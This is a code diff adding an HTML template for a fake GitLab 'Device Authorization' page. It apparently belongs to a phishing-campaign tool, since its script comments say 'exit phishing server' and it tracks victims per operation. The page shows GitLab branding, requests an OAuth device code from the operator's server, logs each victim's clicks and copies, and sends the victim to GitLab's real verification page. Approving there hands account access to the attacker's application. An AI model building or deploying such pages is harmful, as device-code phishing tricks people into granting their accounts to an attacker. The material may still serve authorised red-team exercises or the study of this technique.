@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitLab Device Authorization</title>
+    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+    <link rel="stylesheet" href="/static/css/admin.css">
+    <style>
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--card-bg);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 80px;
+            height: 80px;
+        }
+
+        h1 {
+            color: var(--text-primary);
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .status-container {
+            background: var(--dark-bg);
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .status-step {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .status-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .spinner {
+            border: 3px solid var(--border-color);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            color: var(--text-primary);
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .status-description {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .code-display {
+            background: var(--dark-bg);
+            border: 2px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .code-label {
+            color: var(--text-secondary);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .code-value {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--primary-color);
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 15px;
+            user-select: all;
+            cursor: pointer;
+        }
+        
+        .code-value:hover {
+            background: var(--hover-bg);
+            padding: 5px;
+            border-radius: 4px;
+        }
+
+        .copy-button {
+            background: var(--hover-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 14px;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        .copy-button:hover {
+            background: var(--card-bg);
+            border-color: var(--primary-color);
+        }
+
+        .copy-button:active {
+            transform: translateY(0);
+        }
+
+        .copy-button.copied {
+            background: var(--success-color);
+            color: white;
+            border-color: var(--success-color);
+        }
+
+        .primary-button {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+            margin-top: 10px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+
+        .primary-button:hover {
+            background: #e24329;
+        }
+
+        .primary-button:active {
+            transform: translateY(0);
+        }
+
+        .primary-button:disabled {
+            background: var(--border-color);
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .primary-button a {
+            color: white;
+            text-decoration: underline;
+        }
+
+        .instructions {
+            background: var(--dark-bg);
+            border-left: 3px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .instructions-title {
+            color: var(--text-primary);
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .instructions ol {
+            margin-left: 20px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-icon svg {
+            width: 30px;
+            height: 30px;
+            fill: white;
+        }
+
+        .error-message {
+            background: var(--card-bg);
+            border: 1px solid var(--danger-color);
+            border-radius: 6px;
+            padding: 15px;
+            color: var(--danger-color);
+            margin-top: 20px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .code-value {
+                font-size: 28px;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- GitLab Logo SVG -->
+            <svg viewBox="0 0 210 210" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#FC6D26" d="M105.0614 207.8797L105.0594 207.8797 105.0614 207.8797z"/>
+                <path fill="#E24329" d="M105.0614 207.8797L67.8264 95.6547 142.2964 95.6547z"/>
+                <path fill="#FC6D26" d="M105.0614 207.8797L142.2964 95.6547 194.9014 95.6547z"/>
+                <path fill="#FCA326" d="M194.9014 95.6547L207.5614 132.8547C208.5614 135.8547 207.5614 139.1547 205.0614 141.0547L105.0614 207.8797z"/>
+                <path fill="#E24329" d="M194.9014 95.6547L142.2964 95.6547 164.3514 27.8547C165.3514 24.8547 169.5614 24.8547 170.5614 27.8547z"/>
+                <path fill="#FC6D26" d="M105.0614 207.8797L67.8264 95.6547 15.2214 95.6547z"/>
+                <path fill="#FCA326" d="M15.2214 95.6547L2.5614 132.8547C1.5614 135.8547 2.5614 139.1547 5.0614 141.0547L105.0614 207.8797z"/>
+                <path fill="#E24329" d="M15.2214 95.6547L67.8264 95.6547 45.7714 27.8547C44.7714 24.8547 40.5614 24.8547 39.5614 27.8547z"/>
+            </svg>
+        </div>
+
+        <h1>Device Authorization</h1>
+        <p class="subtitle">Connect your device to GitLab</p>
+
+        <div class="status-container">
+            <!-- Step 1: Connecting -->
+            <div class="status-step active" id="step-connecting">
+                <div class="spinner"></div>
+                <div class="status-text">Connecting to GitLab...</div>
+                <div class="status-description">Establishing secure connection</div>
+            </div>
+
+            <!-- Step 2: Generating Code -->
+            <div class="status-step" id="step-generating">
+                <div class="spinner"></div>
+                <div class="status-text">Generating authorization code...</div>
+                <div class="status-description">Creating unique device code</div>
+            </div>
+
+            <!-- Step 3: Ready to Authorize -->
+            <div class="status-step" id="step-ready">
+                <div class="success-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                </div>
+                <div class="status-text">Ready to authorize!</div>
+                <div class="status-description">Your device code has been generated</div>
+
+                <div class="code-display">
+                    <div class="code-label">Your Device Code</div>
+                    <div class="code-value" id="user-code" onclick="copyCode()" title="Click to copy">--------</div>
+                    <button class="copy-button" id="copy-button" onclick="copyCode()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
+                        </svg>
+                        Copy Code
+                    </button>
+                </div>
+
+                <button class="primary-button" id="authorize-button" onclick="authorizeDevice()">
+                    Authorize Device
+                </button>
+
+                <div class="instructions">
+                    <div class="instructions-title">📋 Instructions:</div>
+                    <ol>
+                        <li>Copy the device code above</li>
+                        <li>Click "Authorize Device" button</li>
+                        <li>Paste the code when prompted</li>
+                        <li>Sign in to your GitLab account</li>
+                        <li>Authorize the application</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="error-message" id="error-message"></div>
+    </div>
+
+    <script>
+        const operationId = {{ operation_id }};
+        const baseUrl = "{{ base_url }}";
+        let userCode = null;
+        let verificationUri = null;
+
+        // Simulate connection and code generation
+        async function initializeDevice() {
+            try {
+                // Step 1: Connecting (simulate delay)
+                await sleep(1000);
+                
+                // Step 2: Generating code
+                showStep('step-generating');
+                await sleep(800);
+                
+                // Generate device code from server
+                const response = await fetch(`/op/${operationId}/api/generate_code`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to generate device code');
+                }
+
+                const result = await response.json();
+                
+                if (!result.success) {
+                    const errorMsg = result.error || 'Unknown error';
+                    // Check if it's an authentication error
+                    if (errorMsg.includes('401') || errorMsg.includes('authentication') || errorMsg.includes('client')) {
+                        throw new Error('Invalid OAuth Client ID. Please verify the Client ID is correct in GitLab.');
+                    }
+                    throw new Error(errorMsg);
+                }
+
+                // Store code data
+                userCode = result.data.user_code;
+                verificationUri = result.data.verification_uri_complete || result.data.verification_uri;
+
+                // Step 3: Ready
+                await sleep(500);
+                showStep('step-ready');
+                document.getElementById('user-code').textContent = userCode;
+
+                // Track page interaction
+                trackInteraction('code_generated');
+
+            } catch (error) {
+                console.error('Error:', error);
+                showError('Failed to generate device code. This may be due to an invalid OAuth Client ID. Please contact the administrator.');
+            }
+        }
+
+        function showStep(stepId) {
+            document.querySelectorAll('.status-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Track if user copied the code manually
+        let userCopiedCode = false;
+
+        function copyCode() {
+            if (!userCode) {
+                console.error('No user code available');
+                return;
+            }
+
+            // Use modern clipboard API with fallback
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(userCode).then(() => {
+                    userCopiedCode = true;  // Mark that user copied manually
+                    updateCopyButton(true);
+                    trackInteraction('code_copied');
+                }).catch(err => {
+                    console.error('Clipboard API failed:', err);
+                    fallbackCopy(userCode);
+                });
+            } else {
+                fallbackCopy(userCode);
+            }
+        }
+
+        function updateCopyButton(success) {
+            const button = document.getElementById('copy-button');
+            if (!button) return;
+            
+            const originalHTML = button.innerHTML;
+            
+            if (success) {
+                button.classList.add('copied');
+                button.innerHTML = `
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                    Copied!
+                `;
+
+                setTimeout(() => {
+                    button.classList.remove('copied');
+                    button.innerHTML = originalHTML;
+                }, 2000);
+            }
+        }
+
+        function fallbackCopy(text) {
+            // Fallback method for older browsers
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.left = '-999999px';
+            textArea.style.top = '-999999px';
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    userCopiedCode = true;  // Mark that user copied manually
+                    updateCopyButton(true);
+                    trackInteraction('code_copied');
+                } else {
+                    showError('Failed to copy code. Please copy it manually.');
+                }
+            } catch (err) {
+                console.error('Fallback copy failed:', err);
+                showError('Failed to copy code. Please copy it manually.');
+            }
+            
+            document.body.removeChild(textArea);
+        }
+
+        function authorizeDevice() {
+            if (!verificationUri) {
+                console.error('No verification URI available');
+                return;
+            }
+
+            // Track authorization click
+            trackInteraction('authorize_clicked');
+
+            // Determine which URL to use based on whether user copied the code
+            let targetUrl;
+            if (userCopiedCode) {
+                // User copied the code manually, send them to the page without auto-fill
+                // Extract the base verification URI without the user_code parameter
+                const url = new URL(verificationUri);
+                url.searchParams.delete('user_code');
+                targetUrl = url.toString();
+                console.log('User copied code manually - redirecting without auto-fill');
+            } else {
+                // User didn't copy, use the complete URI with auto-filled code
+                targetUrl = verificationUri;
+                console.log('User did not copy code - redirecting with auto-fill');
+            }
+
+            // Redirect to GitLab authorization page in the same tab (exit phishing server)
+            window.location.href = targetUrl;
+        }
+
+        async function trackInteraction(type, data = {}) {
+            try {
+                await fetch(`/op/${operationId}/api/interaction`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        timestamp: new Date().toISOString(),
+                        ...data
+                    })
+                });
+            } catch (error) {
+                console.error('Failed to track interaction:', error);
+            }
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('show');
+        }
+
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            initializeDevice();
+        });
+    </script>
+</body>
+</html>
